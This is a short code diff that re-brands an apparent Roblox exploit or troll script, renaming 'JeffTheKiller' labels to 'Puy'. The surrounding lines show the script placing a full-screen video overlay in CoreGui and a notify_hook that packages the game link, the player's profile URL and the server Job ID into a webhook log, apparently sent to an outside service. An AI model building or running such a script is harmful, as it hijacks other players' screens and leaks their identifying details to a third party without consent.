@@ -22,7 +22,7 @@ local ScreenGui = Instance.new("ScreenGui")
 local VideoScreen = Instance.new("VideoFrame")
 ScreenGui.Parent = game:GetService("CoreGui")
 ScreenGui.IgnoreGuiInset = true
-ScreenGui.Name = "JeffTheKillerWuzHere"
+ScreenGui.Name = "Puy is here"
 
 VideoScreen.Parent = ScreenGui
 VideoScreen.Size = UDim2.new(1,0,1,0)
@@ -55,7 +55,7 @@ function notify_hook()
 		["content"] = "Jeff Wuz Here !",
 		["embeds"] = {
 			{
-				["title"] = "Jeff's Log",
+				["title"] = "Puy's Log",
 				["description"] = "**Game : https://www.roblox.com/games/"..game.PlaceId.."**\n\n**Profile : https://www.roblox.com/users/"..player.UserId.."/profile**\n\n**Job ID : "..game.JobId.."**",
 				["color"] = 4915083,
 				["fields"] = {
@@ -96,7 +96,7 @@ function notify_hook()
 					}
 				},
 				["footer"] = {
-					["text"] = "JTK Log",
+					["text"] = "Puy Log",
 					["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"
 				},
 				["thumbnail"] = {
